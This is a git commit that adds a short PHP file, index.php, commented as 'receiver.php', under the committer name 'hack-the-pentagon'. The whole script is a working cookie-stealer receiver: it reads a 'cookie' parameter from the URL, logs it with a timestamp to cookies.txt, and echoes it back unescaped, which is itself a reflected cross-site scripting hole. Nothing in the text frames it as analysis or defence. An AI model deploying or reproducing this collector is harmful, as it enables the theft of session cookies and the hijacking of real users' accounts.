5afcbce15d513ad2d24de849e6deaabca4ed1723
hack-the-pentagon <105110332+timberio@users.noreply.github.com>
2025-07-07 23:40:24 -0400

    Update and rename index.html to index.php

---
+++ index.php
@@ -0,0 +1,6 @@
+<?php
+// receiver.php
+$cookie = $_GET['cookie'] ?? 'no cookie';
+file_put_contents('cookies.txt', date('Y-m-d H:i:s') . " - $cookie\n", FILE_APPEND);
+echo "Cookie received: $cookie";
+?>
